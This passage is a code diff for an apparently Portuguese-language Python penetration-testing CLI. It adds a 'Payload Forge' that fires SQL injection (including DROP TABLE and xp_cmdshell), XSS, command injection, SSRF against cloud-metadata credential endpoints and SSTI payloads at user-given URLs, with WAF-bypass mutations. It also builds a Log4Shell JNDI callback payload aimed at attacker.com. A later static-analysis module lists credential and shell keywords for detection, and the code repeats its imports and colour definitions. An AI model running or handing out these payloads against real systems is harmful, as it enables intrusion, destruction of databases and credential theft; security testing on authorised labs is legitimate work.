@@ -129,6 +129,10 @@ print(YELLOW + "📝Etapas de aprendizagem para cybersegurança📝: 8")
 print("")
 print(GREEN +"🔑BruteForce🔓: 9")
 print("")
+print(YELLOW +"🧪Payload Forge (SQLi/XSS/OSI)🧪: 10")
+print("")
+print(GREEN +"🔬Reverse Engineer (Binário/Script)🔬: 11")
+print("")
 option = int(input("Qual deseja utilizar: "))
 
 def preparar_url(url):
@@ -2852,7 +2856,7 @@ def brute_force():
                                         if key == 'user_id' and (isinstance(value, int) or (isinstance(value, str) and value.isdigit())):
                                             return cand
                                         
-                            # Verificação de mensagens de erro (False Positive Filter)
+                            # Verificação de mensagens de erro 
                             error_keywords = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'bad credentials']
                             resp_text_lower = str(resp_json).lower()
                             if any(ek in resp_text_lower for ek in error_keywords):
@@ -2861,7 +2865,7 @@ def brute_force():
                         except Exception:
                             pass
 
-                    # ESTRATÉGIA 4: Verificação de HTML (Redirecionamento ou Dashboard)
+                    # ESTRATÉGIA 4: Verificação de HTML
                     else:
                         #
                         resp_text_lower = response.text.lower()
@@ -2871,7 +2875,7 @@ def brute_force():
 
                     return None
                 except requests.exceptions.RequestException as e:
-                    # Erro de rede (timeout, proxy caído, etc.)
+                    # Erro de rede 
                     raise
 
             run_parallel_attack(candidates, test_http, "HTTP", max_workers=10)
@@ -2907,6 +2911,906 @@ def brute_force():
     except KeyboardInterrupt:
         print("\n\n[!] Operação cancelada pelo usuário.")
         
+def payload_forge():
+    import requests
+    import urllib.parse
+    import json
+    import time
+    import secrets
+
+    print("\n" + "="*50)
+    print(" 🧪 THECELTIC PAYLOAD FORGE [FIELD MODE]")
+    print("="*50)
+    print("""
+    [1] SQL Injection (SQLi) - Teste Ativo & Payloads
+    [2] Cross-Site Scripting (XSS) - Teste Ativo & Payloads
+    [3] Command Injection (OSI) - Teste Ativo & Payloads
+    [4] Log4Shell / JNDI - Gerador de Probes
+    [5] SSRF / SSTI - Gerador de Probes
+    [6] Gerar Wordlist de Mutations (Para ffuf/Burp)
+    [0] Voltar ao Menu
+    """)
+    
+    try:
+        sub_op = int(input("Escolha o tipo de ataque: "))
+        
+        if sub_op == 0:
+            return
+
+        def save_output(content, filename="theceltic_field_results.txt", header=""):
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"# {header}\n# Gerado por TheCeltic Field Mode\n# Data: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                f.write(content)
+            print(f"{GREEN}[OK] Resultados salvos em {filename}{RESET}")
+
+        def generate_mutations(base_payload):
+            
+            mutations = [base_payload]
+            
+            # 1. URL Encoding
+            try:
+                mutations.append(urllib.parse.quote(base_payload, safe=''))
+            except:
+                pass
+
+            # 2. HTML Entities
+            try:
+                html_mut = base_payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")
+                mutations.append(html_mut)
+            except:
+                pass
+
+            # 3. Whitespace/Comentários (Foco em SQLi)
+            mutations.append(base_payload.replace(" ", "+"))
+            mutations.append(base_payload.replace(" ", "%20"))
+            mutations.append(base_payload.replace(" ", " "))
+            mutations.append(base_payload.replace(" ", "/**/"))
+            
+            # 4. Case Variations (Bypass de filtros case-sensitive)
+            mutations.append(base_payload.upper())
+            mutations.append(base_payload.lower())
+            mutations.append(base_payload.swapcase())
+            
+            # 5. Nested Braces (Log4Shell specific)
+            if "${" in base_payload:
+                mutations.append(base_payload.replace("${", "${${"))
+                mutations.append(base_payload.replace(":", ":${"))
+            
+            # 6. Newlines (Command Injection specific)
+            if ";" in base_payload or "|" in base_payload:
+                mutations.append(base_payload.replace(" ", "\n"))
+                mutations.append(base_payload.replace(" ", "\r\n"))
+                mutations.append(base_payload.replace(" ", "%0A"))
+                mutations.append(base_payload.replace(" ", "%0D%0A"))
+                mutations.append(base_payload.replace(" ", "\\n"))
+
+            # Remove duplicados mantendo a ordem
+            seen = set()
+            unique_mutations = []
+            for m in mutations:
+                if m not in seen:
+                    seen.add(m)
+                    unique_mutations.append(m)
+            return unique_mutations
+
+        def active_test(url, method="GET", payload_field=None, payloads=None, success_indicators=None, error_indicators=None):
+            """
+            Executa um teste ativo injetando payloads e analisando a resposta.
+            """
+            headers = {
+                "User-Agent": "TheCelticField/1.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5"
+            }
+            
+            results = []
+            print(f"\n{YELLOW}[TESTE ATIVO]{RESET} Iniciando varredura em: {url}")
+            print(f"Payloads para testar: {len(payloads)}")
+            
+            for payload in payloads:
+                try:
+                    # Injeção Dinâmica
+                    if payload_field:
+                        if method == "GET":
+                            params = {payload_field: payload}
+                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
+                        elif method == "POST":
+                            data = {payload_field: payload}
+                            response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
+                    else:
+                        # Se não houver campo, assume que a URL tem o placeholder {{payload}}
+                        if "{{payload}}" in url:
+                            # Encode o payload para a URL
+                            encoded_payload = urllib.parse.quote(payload, safe='')
+                            final_url = url.replace("{{payload}}", encoded_payload)
+                            response = requests.get(final_url, headers=headers, timeout=10, verify=False)
+                        else:
+                            # Fallback: tenta adicionar como query param genérico
+                            params = {"payload": payload}
+                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
+                    
+                    # Análise de Resposta
+                    status = response.status_code
+                    content = response.text[:5000] # Limita análise aos primeiros 5KB
+                    content_lower = content.lower()
+                    
+                    is_success = False
+                    is_error = False
+                    reason = ""
+                    
+                    # 1. Verificação de Erros do Banco/Sistema
+                    if error_indicators:
+                        for indicator in error_indicators:
+                            if indicator.lower() in content_lower:
+                                is_error = True
+                                reason = f"Indicador de erro encontrado: {indicator}"
+                                break
+                    
+                    # 2. Verificação de Sucesso
+                    if success_indicators:
+                        for indicator in success_indicators:
+                            if indicator.lower() in content_lower:
+                                is_success = True
+                                reason = f"Indicador de sucesso encontrado: {indicator}"
+                                break
+                    
+                    # 3. Verificação de Reflexão (XSS)
+                    
+                    if not is_success and not is_error:
+                        if payload in content or urllib.parse.quote(payload, safe='') in content:
+                            is_success = True
+                            reason = "Payload refletido na resposta (Possível XSS/Reflexão)"
+
+                    results.append({
+                        "payload": payload,
+                        "status": status,
+                        "result": "SUCCESS" if is_success else ("ERROR" if is_error else "NEUTRAL"),
+                        "reason": reason
+                    })
+                    
+                    if is_success:
+                        print(f"{GREEN}[HIT]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
+                    elif is_error:
+                        print(f"{YELLOW}[ERR]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
+                    else:
+                        print(f"{RESET}[---] Payload: {payload[:50]}... | Status: {status}")
+
+                except requests.exceptions.RequestException as e:
+                    print(f"{RED}[FAIL]{RESET} Erro de rede: {e}")
+
+            return results
+
+        # --- LÓGICA POR TIPO DE ATAQUE ---
+
+        if sub_op == 1: # SQLi
+            print("\n[1] SQLi Field Mode")
+            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
+            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
+            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
+            
+            if not field:
+                if "{{payload}}" not in url:
+                    url = url + "?{{payload}}"
+                field = None
+            
+            print("\n[2] Tipo de SQLi:")
+            print("1. In-Line (União/1=1)")
+            print("2. Error-Based (Extrair Erro)")
+            print("3. Time-Based (Blind)")
+            print("4. Stacked (Múltiplos comandos)")
+            sqli_type = int(input("Escolha (1-4): "))
+
+            error_indicators = ["sql syntax", "mysql_fetch", "pg_query", "ora-", "unclosed quotation mark", "syntax error", "valid mysql result"]
+            success_indicators = ["admin", "root", "true", "1"] # Genérico, ajuste conforme necessário
+
+            if sqli_type == 1:
+                base_payloads = [
+                    "1' OR 1=1-- ",
+                    "1' OR '1'='1",
+                    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
+                    "1' AND 1=1-- ",
+                    "1' AND 1=2-- "
+                ]
+            elif sqli_type == 2:
+                base_payloads = [
+                    "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- ",
+                    "' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- ",
+                    "1' AND 1/0-- "
+                ]
+            elif sqli_type == 3:
+                base_payloads = [
+                    "1' AND SLEEP(5)-- ",
+                    "1' AND BENCHMARK(5000000,SHA1('TEST'))-- ",
+                    "1' AND pg_sleep(5)-- "
+                ]
+            else: # Stacked
+                base_payloads = [
+                    "1'; DROP TABLE users-- ",
+                    "1'; SELECT * FROM sys.tables-- ",
+                    "1'; EXEC xp_cmdshell 'whoami'-- "
+                ]
+            
+            print("Gerando mutações para bypass de WAF...")
+            final_payloads = []
+            for bp in base_payloads:
+                final_payloads.extend(generate_mutations(bp))
+            
+            # Remove duplicados
+            final_payloads = list(set(final_payloads))
+            
+            save_choice = input("Deseja salvar a lista de payloads em TXT antes de testar? (s/n): ").lower() == 's'
+            if save_choice:
+                with open("theceltic_sqli_mutations.txt", 'w') as f:
+                    f.write("\n".join(final_payloads))
+                print(f"{GREEN}[OK] Mutations salvas em theceltic_sqli_mutations.txt{RESET}")
+
+            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
+            if test_choice:
+                results = active_test(
+                    url=url,
+                    method=method,
+                    payload_field=field,
+                    payloads=final_payloads,
+                    success_indicators=success_indicators,
+                    error_indicators=error_indicators
+                )
+                # Salva resultados detalhados
+                if any(r["result"] == "SUCCESS" for r in results):
+                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_sqli_hits.json", "SQLi Active Test Results")
+
+        elif sub_op == 2: # XSS
+            print("\n[2] XSS Field Mode")
+            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
+            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
+            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
+            
+            if not field:
+                if "{{payload}}" not in url:
+                    url = url + "?{{payload}}"
+                field = None
+
+            print("\n[2] Contexto XSS:")
+            print("1. HTML (Texto puro)")
+            print("2. Attribute (Dentro de atributo)")
+            print("3. JavaScript (Dentro de JS)")
+            print("4. Universal (Polyglot)")
+            xss_type = int(input("Escolha (1-4): "))
+
+            # Indicadores de Sucesso para XSS: O payload deve aparecer na resposta
+            success_indicators = ["theceltic_xss_marker"] 
+            error_indicators = []
+
+            if xss_type == 1:
+                payloads = [
+                    "<script>alert('TheCeltic_XSS_Marker')</script>",
+                    "<img src=x onerror=alert('TheCeltic_XSS_Marker')>",
+                    "<svg onload=alert('TheCeltic_XSS_Marker')>"
+                ]
+            elif xss_type == 2:
+                payloads = [
+                    "\" onmouseover=alert('TheCeltic_XSS_Marker')",
+                    "' onmouseover=alert('TheCeltic_XSS_Marker')",
+                    "` onmouseover=alert('TheCeltic_XSS_Marker')"
+                ]
+            elif xss_type == 3:
+                payloads = [
+                    "'; alert('TheCeltic_XSS_Marker'); //",
+                    "\"; alert('TheCeltic_XSS_Marker'); //",
+                    "`; alert('TheCeltic_XSS_Marker'); //"
+                ]
+            else:
+                payloads = [
+                    "\"'><img src=x onerror=alert('TheCeltic_XSS_Marker')>",
+                    "';\"><script>alert('TheCeltic_XSS_Marker')</script>",
+                    "`'><svg/onload=alert('TheCeltic_XSS_Marker')>"
+                ]
+
+            # Gera mutações básicas
+            final_payloads = []
+            for p in payloads:
+                final_payloads.extend(generate_mutations(p))
+            final_payloads = list(set(final_payloads))
+
+            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
+            if test_choice:
+                # Para XSS, o "sucesso" é a reflexão do payload
+                results = active_test(
+                    url=url,
+                    method=method,
+                    payload_field=field,
+                    payloads=final_payloads,
+                    success_indicators=success_indicators,
+                    error_indicators=error_indicators
+                )
+                if any(r["result"] == "SUCCESS" for r in results):
+                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_xss_hits.json", "XSS Active Test Results")
+
+        elif sub_op == 3: # Command Injection
+            print("\n[3] Command Injection Field Mode")
+            url = input("URL Base (ex: http://lab.com/ping.php?ip=): ").strip()
+            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
+            field = input("Nome do campo para injeção (ex: ip) [ENTER para usar {{payload}}]: ").strip()
+            
+            if not field:
+                if "{{payload}}" not in url:
+                    url = url + "?{{payload}}"
+                field = None
+
+            payloads = [
+                "127.0.0.1; whoami",
+                "127.0.0.1 | whoami",
+                "127.0.0.1 `whoami`",
+                "127.0.0.1 $(whoami)",
+                "127.0.0.1 && whoami"
+            ]
+            
+            # Adiciona mutações
+            final_payloads = []
+            for p in payloads:
+                final_payloads.extend(generate_mutations(p))
+            final_payloads = list(set(final_payloads))
+
+            # Indicadores: Output de comando (root, www-data, etc)
+            success_indicators = ["root", "www-data", "apache", "nobody", "uid=", "gid="]
+            error_indicators = []
+
+            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
+            if test_choice:
+                results = active_test(
+                    url=url,
+                    method=method,
+                    payload_field=field,
+                    payloads=final_payloads,
+                    success_indicators=success_indicators,
+                    error_indicators=error_indicators
+                )
+
+        elif sub_op == 4: # Log4Shell
+            print("\n[4] Log4Shell / JNDI Probes")
+            
+            unique_id = secrets.token_hex(8)
+            base_url = input("Seu domínio/IP para o callback (ex: 192.168.1.10): ").strip() or "attacker.com"
+            payload = "${" + "${lower:j}ndi:ldap://" + base_url + "/theceltic_" + unique_id + "}}"
+            
+            print(f"\n{GREEN}PAYLOAD GERAL:{RESET}\n{payload}")
+            print(f"\n{YELLOW}COMO TESTAR:{RESET}")
+            print(f"1. Inicie um listener LDAP: ldapsearch -x -H ldap://{base_url} -b '' -s base -LLL")
+            print(f"   Ou use: java -cp . LdapServer")
+            print(f"2. Insira este payload em headers (User-Agent, X-Forwarded-For) ou parâmetros.")
+            print(f"3. Monitore o callback para a string: theceltic_{unique_id}")
+            
+            save_choice = input("Salvar payload em TXT? (s/n): ").lower() == 's'
+            if save_choice:
+                save_output(payload, "theceltic_log4shell_payload.txt", "Log4Shell Probe")
+
+        elif sub_op == 5: # SSRF / SSTI
+            print("\n[5] SSRF / SSTI Field Mode")
+            print("1. SSRF (Cloud Metadata & Internal Services)")
+            print("2. SSTI (Server-Side Template Injection)")
+            sub_5 = int(input("Escolha (1-2): "))
+            
+            url = input("URL Base (ex: http://lab.com/fetch?url=): ").strip()
+            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
+            field = input("Nome do campo para injeção (ex: url) [ENTER para usar {{payload}}]: ").strip()
+            
+            if not field:
+                if "{{payload}}" not in url:
+                    url = url + "?{{payload}}"
+                field = None
+
+            if sub_5 == 1: # SSRF
+                payloads = [
+                    "http://169.254.169.254/latest/meta-data/",
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                    "http://127.0.0.1:8080/admin",
+                    "http://localhost:5984/_all_dbs",
+                    "gopher://localhost:6379/_INFO",
+                    "dict://localhost:6379/info",
+                    "file:///etc/passwd"
+                ]
+                # Indicadores de Sucesso: Metadados da nuvem ou conteúdo de arquivo local
+                success_indicators = ["ami-id", "instance-id", "accesskey", "root:", "etc/passwd", "admin", "dashboard"]
+                error_indicators = ["connection refused", "timeout", "404 not found"]
+                
+            else: # SSTI
+                payloads = [
+                    "{{7*7}}",
+                    "${7*7}",
+                    "<%= 7*7 %>",
+                    "#{7*7}",
+                    "{{self.__class__.__mro__}}",
+                    "{{config.items()}}",
+                    "{{7*'A'}}"
+                ]
+                
+                success_indicators = ["49", "AAA", "mro", "config", "jinja2", "mako", "django", "tornado"]
+                error_indicators = ["syntaxerror", "invalidsyntax", "templateerror"]
+
+            final_payloads = list(set(payloads))
+            
+            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
+            if test_choice:
+                results = active_test(
+                    url=url,
+                    method=method,
+                    payload_field=field,
+                    payloads=final_payloads,
+                    success_indicators=success_indicators,
+                    error_indicators=error_indicators
+                )
+                if any(r["result"] == "SUCCESS" for r in results):
+                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_ssrf_ssti_hits.json", "SSRF/SSTI Active Test Results")
+
+        elif sub_op == 6: # Gerar Wordlist de Mutations
+            print("\n[6] Gerador de Wordlist de Mutations (Para ffuf/Burp)")
+            print("1. SQLi (Comentários, Whitespace, Case)")
+            print("2. XSS (HTML Entities, URL Encoding)")
+            print("3. Command Injection (Newlines, Whitespace)")
+            print("4. Log4Shell (Nested Braces)")
+            print("5. Custom (Digite o payload base)")
+            
+            mut_type = int(input("Escolha (1-5): "))
+            output_file = input("Nome do arquivo de saída (padrão: theceltic_mutations.txt): ").strip() or "theceltic_mutations.txt"
+            
+            base_payload = ""
+            if mut_type == 5:
+                base_payload = input("Digite o payload base: ").strip()
+            else:
+                # Payloads base específicos para mutação
+                if mut_type == 1:
+                    base_payload = "1' OR 1=1-- "
+                elif mut_type == 2:
+                    base_payload = "<script>alert(1)</script>"
+                elif mut_type == 3:
+                    base_payload = "; whoami"
+                elif mut_type == 4:
+                    base_payload = "${jndi:ldap://attacker.com/a}"
+
+            print(f"Gerando mutações baseadas em: {base_payload}")
+            
+            # Gera as mutações usando a função existente
+            final_mutations = generate_mutations(base_payload)
+            
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(final_mutations))
+            
+            print(f"{GREEN}[OK] {len(final_mutations)} mutações salvas em {output_file}{RESET}")
+            print(f"Dica: Use 'ffuf -w {output_file} -X GET -H 'User-Agent: TheCeltic' -- {url}'")
+
+        else:
+            print("[!] Opção inválida.")
+
+    except ValueError:
+        print("[!] Digite um número válido.")
+    except KeyboardInterrupt:
+        print("\n\n[!] Operação cancelada pelo usuário.")
+
+import os
+import hashlib
+import re
+import math
+import struct
+import json
+import platform
+import datetime
+import html
+import zipfile
+from collections import Counter
+
+# Definição de cores ANSI
+class C:
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+
+# Usando alias para facilitar a leitura no código abaixo
+RED = C.RED
+GREEN = C.GREEN
+YELLOW = C.YELLOW
+BLUE = C.BLUE
+RESET = C.RESET
+
+import os
+import sys
+import re
+import math
+import struct
+import hashlib
+import platform
+import zipfile
+import datetime
+from collections import Counter
+
+# ANSI Colors
+RESET = '\033[0m'
+BLUE = '\033[94m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+
+def reverse_engineer():
+    print("\n" + "="*50)
+    print(f"{BLUE} 🔬 THECELTIC REVERSE ENGINEER [FIELD MODE]{RESET}")
+    print("="*50)
+    print(f"{BLUE}Análise estática de binários, scripts e arquivos de dados.")
+    print(f"{BLUE}Recursos: Entropia, Strings, Packer Detection, PE/ELF Headers.")
+    print("")
+    
+    # Detecta o SO
+    current_os = platform.system()
+    print(f"[INFO] Ambiente: {current_os}")
+    print("")
+    
+    file_path = input("Caminho do arquivo (ex: ./beacon.exe ou ./script.py): ").strip()
+    
+    if not os.path.exists(file_path):
+        print(f"{RED}[ERRO]{RESET} Arquivo não encontrado: {file_path}")
+        return
+
+    file_size = os.path.getsize(file_path)
+    if file_size == 0:
+        print(f"{RED}[ERRO]{RESET} O arquivo está vazio.")
+        return
+
+    print(f"\n[INFO] Analisando: {os.path.basename(file_path)}")
+    print(f"[INFO] Tamanho: {file_size} bytes ({file_size/1024:.2f} KB)")
+
+    # 1. HASHING
+    print("\n" + "-"*20)
+    print(" [1] HASHING (Integridade)")
+    print("-"*20)
+    hashes = {}
+    for algo in ['md5', 'sha1', 'sha256']:
+        h = hashlib.new(algo)
+        with open(file_path, 'rb') as f:
+            for block in iter(lambda: f.read(4096), b''):
+                h.update(block)
+        hashes[algo] = h.hexdigest()
+        print(f"{algo.upper()}: {hashes[algo]}")
+    
+    # 2. ENTROPIA
+    print("\n" + "-"*20)
+    print(" [2] ANÁLISE DE ENTROPIA")
+    print("-"*20)
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    
+    if not data:
+        print("Arquivo vazio.")
+        return
+
+    # Usando Counter é mais eficiente que loop manual
+    byte_counts = Counter(data)
+    total_bytes = len(data)
+    
+    entropy = 0.0
+    for count in byte_counts.values():
+        p_x = count / total_bytes
+        if p_x > 0:
+            entropy -= p_x * math.log2(p_x)
+            
+    print(f"Entropia: {entropy:.4f} bits/byte")
+    if entropy > 7.5:
+        print(f"{RED}[ALERTA]{RESET} Alta entropia. Possível ofuscamento, criptografia ou Packer.")
+    elif entropy > 6.0:
+        print(f"{YELLOW}[INFO]{RESET} Entropia média. Binário provavelmente não empacotado.")
+    else:
+        print(f"{GREEN}[INFO]{RESET} Entropia baixa. Arquivo pode ser texto, script ou binário simples.")
+
+    # 3. STRINGS
+    print("\n" + "-"*20)
+    print(" [3] EXTRAÇÃO DE STRINGS CRÍTICAS")
+    print("-"*20)
+    pattern = re.compile(b'[\x20-\x7E]{6,}')
+    strings_found = set(m.group(0).decode('utf-8', errors='ignore') for m in pattern.finditer(data))
+    
+    security_keywords = [
+        r'http://', r'https://', r'ldap://', r'amqp://', r'mqtt://',
+        r'password', r'passwd', r'secret', r'api_key', r'token', r'credential',
+        r'admin', r'root', r'system32', r'registry', r'winreg', r'hkcu', r'hklm',
+        r'powershell', r'cmd.exe', r'bash', r'sh -c', r'exec', r'system',
+        r'theceltic', r'beacon', r'c2', r'callback', r'jndi', r'log4shell',
+        r'sleep', r'benchmark', r'pg_sleep', r'extractvalue', r'updatexml',
+        r'union', r'select', r'insert', r'update', r'delete', r'drop',
+        r'onerror', r'onload', r'onclick', r'javascript:', r'vbscript:',
+        r'whoami', r'id', r'uname', r'ifconfig', r'ipconfig', r'netstat',
+        r'169.254.169.254', r'metadata', r'iam', r'security-credentials'
+    ]
+    
+    interesting_strings = []
+    for s in strings_found:
+        for kw in security_keywords:
+            if re.search(kw, s, re.IGNORECASE):
+                interesting_strings.append(s)
+                break
+
+    if interesting_strings:
+        print(f"Encontradas {len(interesting_strings)} strings de interesse:")
+        for s in interesting_strings[:30]:
+            display_s = s[:120] + ("..." if len(s) > 120 else "")
+            print(f"  - {display_s}")
+        
+        save_choice = input("Deseja salvar TODAS as strings em um arquivo .txt? (s/n): ").lower() == 's'
+        if save_choice:
+            out_file = os.path.basename(file_path) + "_strings.txt"
+            with open(out_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(sorted(interesting_strings)))
+            print(f"{GREEN}[OK]{RESET} Strings salvas em {out_file}")
+    else:
+        print(f"{YELLOW}[INFO]{RESET} Nenhuma string crítica encontrada.")
+
+    # 4. DETECTOR DE PACKER
+    print("\n" + "-"*20)
+    print(" [4] DETECTOR DE PACKER (Assinaturas)")
+    print("-"*20)
+    packers = {
+        b'UPX!': "UPX",
+        b'UPX0': "UPX (Zeroed)",
+        b'Themida': "Themida",
+        b'VMProtect': "VMProtect",
+        b'ASPack': "ASPack",
+        b'FSG': "FSG (FSGuard)",
+        b'PEtite': "PEtite",
+        b'MPRESS': "MPRESS",
+        b'Nspack': "NSPack",
+        b'PECompact': "PECompact",
+        b"Yoda's Cryptic": "Yoda's Cryptic",
+        b'Armadillo': "Armadillo",
+        b'Enigma': "Enigma Protector",
+        b'ASProtect': "ASProtect",
+        b'ExeCryptor': "ExeCryptor",
+        b'PEbundle': "PEbundle"
+    }
+    found_packer = None
+    for sig, name in packers.items():
+        if sig in data:
+            found_packer = name
+            break
+            
+    if found_packer:
+        print(f"{RED}[ALERTA]{RESET} Packer detectado: {found_packer}")
+        print("Recomendação: Descompacte (unpack) antes de análise estática profunda.")
+    else:
+        print(f"{GREEN}[OK]{RESET} Nenhum packer comum detectado.")
+
+    # 5. ANÁLISE ESPECÍFICA POR TIPO
+    print("\n" + "-"*20)
+    print(" [5] ANÁLISE ESPECÍFICA POR TIPO")
+    print("-"*20)
+    
+    file_type = "Desconhecido"
+    
+    # --- PE (Windows Executável) ---
+    if data[:2] == b'MZ':
+        file_type = "Executável Windows (PE)"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Windows (PE).")
+        try:
+            # Offset do header PE 
+            pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
+            
+            # Verificação de segurança
+            if pe_offset + 24 > len(data):
+                raise ValueError("Arquivo truncado ou offset inválido")
+
+            if data[pe_offset:pe_offset+4] == b'PE\0\0':
+                
+                # Machine Type
+                machine = struct.unpack('<H', data[pe_offset+4:pe_offset+6])[0]
+                # TimeDateStamp
+                timestamp_raw = struct.unpack('<I', data[pe_offset+8:pe_offset+12])[0]
+                try:
+                    timestamp = datetime.datetime.utcfromtimestamp(timestamp_raw).isoformat()
+                except:
+                    timestamp = "N/A"
+                
+                opt_header_size = struct.unpack('<H', data[pe_offset+20:pe_offset+22])[0]
+                
+                opt_start = pe_offset + 24
+                
+                # Verifica se o arquivo é grande o suficiente
+                if opt_start + 0x42 <= len(data):
+                    subsystem = struct.unpack('<H', data[opt_start + 0x40:opt_start + 0x42])[0]
+                    sub_name = {2: "GUI", 3: "CUI", 1: "Native", 7: "POSIX"}.get(subsystem, f"Unknown ({subsystem})")
+                else:
+                    sub_name = "N/A (Truncado)"
+
+                print(f"[INFO] PE Header válido no offset: {hex(pe_offset)}")
+                print(f"[INFO] Machine: {hex(machine)}")
+                print(f"[INFO] Timestamp: {timestamp}")
+                print(f"[INFO] Subsystem: {sub_name}")
+                
+            else:
+                print(f"{YELLOW}[WARN]{RESET} MZ header presente, mas PE header não encontrado no offset esperado.")
+        except (struct.error, IndexError, ValueError) as e:
+            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar estrutura PE: {e}")
+    
+    # --- ELF (Linux Executável) ---
+    elif data[:4] == b'\x7fELF':
+        file_type = "Executável Linux (ELF)"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Linux (ELF).")
+        try:
+            # ELF Header básico
+            e_ident_class = data[4] # 1: 32-bit, 2: 64-bit
+            e_machine = struct.unpack('<H', data[18:20])[0]
+            print(f"[INFO] Classe: {'32-bit' if e_ident_class == 1 else '64-bit' if e_ident_class == 2 else 'Unknown'}")
+            
+            # Strings de caminho
+            path_strings = re.findall(b'[/\\][\w\-\.]+[/\\][\w\-\.]+', data)
+            if path_strings:
+                unique_paths = list(set(path_strings))[:10]
+                print(f"[INFO] Strings de caminho detectadas ({len(unique_paths)}):")
+                for ps in unique_paths:
+                    print(f"  - {ps.decode('utf-8', errors='ignore')}")
+        except Exception as e:
+            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar ELF: {e}")
+    
+    # --- Mach-O (macOS Executável) ---
+    
+    macho_magics = [b'\xfe\xed\xfa\xce', b'\xcf\xfa\xed\xfe', b'\xfe\xed\xfa\xcf', b'\xcf\xfa\xed\xfe']
+    if data[:4] in macho_magics:
+        file_type = "Executável macOS (Mach-O)"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável macOS (Mach-O).")
+        # Mach-O header
+        try:
+            # Determine endianness based on magic
+            if data[:4] == b'\xfe\xed\xfa\xce':
+                endian = '<'
+            elif data[:4] == b'\xcf\xfa\xed\xfe':
+                endian = '>'
+            elif data[:4] == b'\xfe\xed\xfa\xcf':
+                endian = '<'
+            elif data[:4] == b'\xcf\xfa\xed\xfe':
+                endian = '>'
+            else:
+                endian = '<' # Default
+
+            cputype = struct.unpack(f'{endian}I', data[4:8])[0]
+            cpusubtype = struct.unpack(f'{endian}I', data[8:12])[0]
+            filetype = struct.unpack(f'{endian}I', data[12:16])[0]
+            
+            cpu_names = {7: "x86", 12: "x86_64", 18: "ARM", 19: "ARM64"}
+            file_type_names = {1: "OBJECT", 2: "EXECUTE", 3: "DYNAMICLINK", 4: "CORE"}
+            
+            print(f"[INFO] CPU Type: {cpu_names.get(cputype, hex(cputype))}")
+            print(f"[INFO] File Type: {file_type_names.get(filetype, filetype)}")
+        except Exception as e:
+            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar Mach-O: {e}")
+
+    # --- Python Script ---
+    elif file_path.endswith('.py') or b'import ' in data[:1024]:
+        file_type = "Script Python"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Script Python.")
+        try:
+            content = data.decode('utf-8', errors='ignore')
+            # Extrai imports
+            imports = re.findall(r'^\s*import\s+([\w\.]+)', content, re.MULTILINE)
+            from_imports = re.findall(r'^\s*from\s+([\w\.]+)\s+import', content, re.MULTILINE)
+            
+            all_imports = set(imports + from_imports)
+            if all_imports:
+                print(f"Imports detectados ({len(all_imports)}):")
+                for imp in sorted(all_imports):
+                    print(f"  - {imp}")
+            
+            if 'subprocess' in content:
+                print(f"{RED}[ALERTA]{RESET} Uso de 'subprocess' detectado.")
+            if 'socket' in content:
+                print(f"{YELLOW}[INFO]{RESET} Uso de 'socket' detectado.")
+            if 'os.system' in content:
+                print(f"{RED}[ALERTA]{RESET} Uso de 'os.system' detectado.")
+        except Exception as e:
+            print(f"Erro ao ler script: {e}")
+
+    # --- Java JAR/Class ---
+    elif data[:4] == b'PK\x03\x04':
+        file_type = "Arquivo ZIP (Possível JAR/Office)"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como formato ZIP.")
+        try:
+            with zipfile.ZipFile(file_path, 'r') as zip_ref:
+                file_list = zip_ref.namelist()
+                # Heurística para JAR vs Office
+                is_jar = any(f.endswith('.class') for f in file_list)
+                is_office = any(f.startswith('word/') or f.startswith('xl/') or f.startswith('ppt/') for f in file_list)
+                
+                if is_jar:
+                    file_type = "Arquivo Java (JAR)"
